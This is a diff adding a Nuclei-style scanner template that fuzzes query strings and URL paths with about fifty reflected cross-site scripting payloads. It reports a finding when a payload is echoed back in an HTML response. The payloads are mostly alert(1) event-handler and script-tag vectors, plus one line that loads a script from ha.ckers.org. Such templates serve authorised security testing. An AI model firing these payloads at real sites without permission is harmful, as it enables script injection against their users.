@@ -1,0 +1,95 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<tt onclick=\"alert(1)\">test</tt>"
+        - "<SCRIPT>alert(909)</SCRIPT><script>alert('XSS');</script>"
+        - "<style>@keyframes x{}</style><marquee style=\"animation-name:x\" onanimationend=\"alert(1)\"></marquee>"
+        - "<video autoplay controls onprogress=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>"
+        - "<del id=x tabindex=1 ondeactivate=alert(1)></del>"
+        - "<frameset id=x tabindex=1 onfocusin=alert(1)></frameset><input autofocus>"
+        - "<style>@keyframes x{}</style><bgsound style=\"animation-name:x\" onanimationend=\"alert(1)\"></bgsound>"
+        - "<plaintext oncontextmenu=\"alert(1)\">test</plaintext>"
+        - "<embed draggable=\"true\" ondragend=\"alert(1)\">test</embed>"
+        - "<SCRIPT>alert(1)</script"
+        - "<basefont draggable=\"true\" ondragend=\"alert(1)\">test</basefont>"
+        - "<body id=x tabindex=1 onbeforeactivate=alert(1)></body><input autofocus>"
+        - "<svg><style>@keyframes slidein {}</style><figcaption style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></figcaption>"
+        - "<map draggable=\"true\" ondragend=\"alert(1)\">test</map>"
+        - "<SCRIPT>alert(1)</SCRIPT"
+        - "<;BGSOUND SRC=\";http://ha.ckers.org/scriptlet.html\";>;"
+        - "<details onclick=\"alert(1)\">test</details>"
+        - "<marquee onkeydown=\"alert(1)\" contenteditable>test</marquee>"
+        - "<style>:target {color:red;}</style><progress id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></progress>"
+        - "<colgroup onclick=\"alert(1)\">test</colgroup>"
+        - "<iframe src=\"&lt;img src=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;\""
+        - "<video autoplay controls onpause=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>"
+        - "<IMG SRC=x onerror=\"javascript:alert(1)\">"
+        - "<dl onbeforecut=\"alert(1)\" contenteditable>test</dl>"
+        - "<plaintext onclick=\"alert(1)\">test</plaintext>"
+        - "<script>alert(1)</script>//"
+        - "<plaintext onmousemove=\"alert(1)\">test</plaintext>"
+        - "<font draggable=\"true\" ondragleave=\"alert(1)\">test</font>"
+        - "<tt onmousedown=\"alert(1)\">test</tt>"
+        - "<noframes id=x tabindex=1 ondeactivate=alert(1)></noframes><input autofocus>"
+        - "<iframe onloadend=alert(1)>"
+        - "<input type=\"text\" autocomplete=\"off\" autofocus>"
+        - "<plaintext onclick=\"alert(1)\">test</plaintext>"
+        - "<script>alert(1)</script>"
+        - "<mark oncopy=\"alert(1)\" contenteditable>test</mark>"
+        - "<frameset draggable=\"true\" ondragend=\"alert(1)\">test</frameset>"
+        - "<SCRIPT>alert(1)</SCRIPT>"
+        - "<xmp onpaste=\"alert(1)\" contenteditable>test</xmp>"
+        - "<SCRIPT>alert(1)</SCRIPT>"
+        - "<SCRIPT>alert(\"XSS\")</SCRIPT>"
+        - "<menu id=x tabindex=1 ondeactivate=alert(1)></menu><input id=y autofocus>"
+        - "<audio autoplay controls onended=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>"
+        - "<script>alert(1)</script>"
+        - "<html draggable=\"true\" ondragend=\"alert(1)\">test</html>"
+        - "<style>@keyframes slidein {}</style><th style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></th>"
+        - "<svg id=x tabindex=1 onactivate=alert(1)></svg><input autofocus>"
+        - "<iframe src=%2242.42.43%22 onload=alert(1)>"
+        - "<svg/onload=\"javascript:alert(1)\"></svg/onload>"
+        - "<video autoplay controls ontimeupdate=alert(1)></video>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
